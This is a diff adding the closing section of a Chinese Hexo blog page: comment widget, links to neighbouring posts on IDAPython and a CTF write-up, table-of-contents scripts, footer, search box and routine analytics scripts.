+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: '',
+        owner: '',
+        admin: null,
+        id: '2021-01-02T11-24-31',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/LawlietLW.github.io/2021/01/25/ida7-5-xia-de-idapython-shi-yong/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="IDA7.5下的idapython使用">
+                        
+                        <span class="card-title">IDA7.5下的idapython使用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            开始学习IDApython的使用
+网上的教程都是基于7.0版本的IDA，自IDA7.4之后，idapython的语法就有了变化，且由py2转移到了py3，所以需要对照着Hexray官方的说明来修改，链接
+跟着这个教程一点点学习
+
+IDApy
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-25
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Lock
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/LawlietLW.github.io/2020/11/15/qi-xing-ji-hua-2/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="七星计划(2)">
+                        
+                        <span class="card-title">七星计划(2)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            这一次来记载一些题目吧~
+先从最近的题目开始
+0x1.太湖杯-easykooc首先检查保护
+
+mips32小端序，存在RWX段，所以可以执行shellcode
+然后IDA…啊不，是ghidra分析(好想体验IDA分析mips的感觉啊，虽然g
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/LawlietLW.github.io/tags/PWN/">
+                        <span class="chip bg-color">PWN</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('2'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="https://lawliet.ren" target="_blank">Lock</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">90.2k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2499086884@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2499086884" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2499086884" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/LawlietLW.github.io/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/LawlietLW.github.io/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', '');
+</script>
+
+
+    <!-- Baidu Analytics -->
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
